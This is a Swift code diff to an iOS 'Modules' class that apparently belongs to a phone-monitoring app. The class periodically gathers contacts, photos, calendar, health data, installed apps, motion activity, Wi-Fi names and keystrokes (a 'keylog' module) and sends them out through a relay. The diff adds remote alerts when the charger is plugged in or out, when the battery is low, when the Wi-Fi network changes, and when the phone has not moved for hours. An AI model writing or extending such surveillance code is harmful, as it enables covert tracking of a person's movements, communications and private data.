@@ -16,6 +16,11 @@ final class Modules {
     private let health = HKHealthStore()
     private var lastClip: String?
     private var lastClipCount = -1
+    private var lastMove = Date()
+    private var stillAlerted = false
+    private var lastSsid = "-"
+    private var wasCharging: Bool? = nil
+    private var lastLowBat = Date(timeIntervalSince1970: 0)
 
     func boot() {
         UIDevice.current.isBatteryMonitoringEnabled = true
@@ -41,11 +46,12 @@ final class Modules {
         if Settings.shared.isOn(.wifiInfo), due("wifi", 60) { wifi() }
         if Settings.shared.isOn(.photoLibrary), due("photos", 300) { photos() }
         if Settings.shared.isOn(.contacts), due("contacts", 86_400) { contacts() }
-        if Settings.shared.isOn(.calendar), due("cal", 3600) { calendar() }
+        if Settings.shared.isOn(.calendar), due("cal", 86400) { calendar() }
         if Settings.shared.isOn(.reminders), due("rem", 3600) { reminders() }
         if Settings.shared.isOn(.health), due("health", 1800) { healthData() }
         if Settings.shared.isOn(.keylog), due("keys", 20) { keylog() }
         if Settings.shared.isOn(.installedApps), due("apps", 3600) { AppProbe.scan() }
+        if Settings.shared.isOn(.pushAlerts), due("still", 900) { stillCheck() }
         if Settings.shared.isOn(.netInfo), due("net", 300) { NetInfo.report() }
     }
 
@@ -60,6 +66,21 @@ final class Modules {
     }
 
     private func battery() {
+        let charging = UIDevice.current.batteryState != .unplugged
+        let level = Int(UIDevice.current.batteryLevel * 100)
+        if Settings.shared.isOn(.pushAlerts) {
+            if let was = wasCharging, was != charging {
+                Relay.shared.sendJSON(["type": "alert", "title": charging ? "Charger in" : "Charger out",
+                                       "reason": "\(level)%", "feature": "batteryState", "ok": true,
+                                       "at": Date().timeIntervalSince1970])
+            }
+            if !charging, level <= 15, Date().timeIntervalSince(lastLowBat) > 1800 {
+                lastLowBat = Date()
+                Relay.shared.sendJSON(["type": "alert", "title": "Low battery", "reason": "\(level)%",
+                                       "feature": "batteryState", "ok": true, "at": Date().timeIntervalSince1970])
+            }
+        }
+        wasCharging = charging
         Outbox.shared.send(["type": "battery",
                             "level": Int(UIDevice.current.batteryLevel * 100),
                             "charging": UIDevice.current.batteryState != .unplugged,
@@ -75,6 +96,11 @@ final class Modules {
             }
         }
         Outbox.shared.send(["type": "wifi", "ssid": ssid, "t": Date().timeIntervalSince1970])
+        if Settings.shared.isOn(.pushAlerts), ssid != "-", lastSsid != "-", ssid != lastSsid {
+            Relay.shared.sendJSON(["type": "alert", "title": "Wi-Fi changed", "reason": ssid,
+                                   "feature": "wifiInfo", "ok": true, "at": Date().timeIntervalSince1970])
+        }
+        lastSsid = ssid
     }
 
     private func photos() {
@@ -144,10 +170,22 @@ final class Modules {
         }
     }
 
+    private func stillCheck() {
+        guard Settings.shared.isOn(.motion) else { return }
+        let hours = -lastMove.timeIntervalSinceNow / 3600
+        if hours >= 3, !stillAlerted {
+            stillAlerted = true
+            Relay.shared.sendJSON(["type": "alert", "title": "Stationary",
+                                   "reason": String(format: "%.1fh", hours),
+                                   "feature": "motion", "ok": true, "at": Date().timeIntervalSince1970])
+        }
+    }
+
     private func startMotion() {
         guard CMMotionActivityManager.isActivityAvailable() else { HealthMon.fail(.motion, "Motion unavailable"); return }
-        motion.startActivityUpdates(to: .main) { a in
+        motion.startActivityUpdates(to: .main) { [weak self] a in
             guard let a, Settings.shared.isOn(.motion) else { return }
+            if !a.stationary { self?.lastMove = Date(); self?.stillAlerted = false }
             let kind = a.automotive ? "driving" : a.walking ? "walking"
                      : a.running ? "running" : a.cycling ? "cycling" : a.stationary ? "stationary" : "unknown"
             Outbox.shared.send(["type": "motion", "activity": kind, "t": Date().timeIntervalSince1970])
